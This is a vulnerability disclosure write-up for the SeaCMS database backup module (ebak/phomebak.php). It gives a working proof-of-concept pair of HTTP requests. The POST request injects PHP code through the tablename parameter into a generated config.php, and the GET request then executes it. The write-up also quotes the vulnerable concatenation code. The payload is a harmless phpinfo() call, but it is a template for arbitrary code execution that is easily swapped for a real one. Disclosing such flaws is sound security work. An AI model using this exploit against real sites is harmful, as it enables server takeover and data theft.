13.1 Arbitrary command execution exists in ebak/phomebak.php

vulnerability process



Visit 

/ebak/ChangeDb.php

Come to the following interface

![image-20240821104415493](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821104415493.png)

Click the bottom to start backup capture

POC

```java
POST /p8qca/ebak/phomebak.php HTTP/1.1
Host: seacms:8181
Content-Length: 249
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms:8181
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/p8qca/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM; PHPSESSID=ue9mbk40fljo685p48ijq7nf3j
Connection: keep-alive

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=lll&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=";phpinfo();/*&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD
```

Modify mypath=lll to the name of the created directory

tablename%5B%5D=";phpinfo();/* is the malicious code

Visit the following page

```java
GET /p8qca/ebak/phome.php?phome=PathGotoRedata&mypath=lll HTTP/1.1
Host: seacms:8181
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/p8qca/ebak/ChangePath.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; XDEBUG_SESSION=PHPSTORM; PHPSESSID=ue9mbk40fljo685p48ijq7nf3j
Connection: keep-alive

```

Successful execution of malicious code

![image-20240821104718306](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821104718306.png)

Code analysis

In phomebak.php, there is the following code

```java
if($phome=="DoEbak")//Initialize the backup table
{
Ebak_DoEbak($_POST);
}
```

We can control the phome parameter, when entering the Ebak_DoEbak method for DoEbak

In this method, there is

```java
$string="<?php 
	\$b_table=\"".$b_table."\";
	".$d_table."
	\$b_baktype=".$add['baktype'].";
	\$b_filesize=".$add['filesize'].";
	\$b_bakline=".$add['bakline'].";
	\$b_autoauf=".$add['autoauf'].";
	\$b_dbname=\"".$dbname."\";
	\$b_stru=".$bakstru.";
	\$b_strufour=".$bakstrufour.";
	\$b_dbchar=\"".addslashes($add['dbchar'])."\";
	\$b_beover=".$beover.";
	\$b_insertf=\"".addslashes($insertf)."\";
	\$b_autofield=\",".addslashes($add['autofield']).",\";
	\$b_bakdatatype=".$bakdatatype.";
	 ?>";
	$cfile=$bakpath."/".$add['mypath']."/config.php";
	WriteFiletext_n($cfile,$string);
```

It can be found that the input b_table, that is, our tablename, is directly concatenated, and $cfile=$bakpath."/".$add['mypath']."/config.php"; that is, the config.php file

Command execution is caused by special input
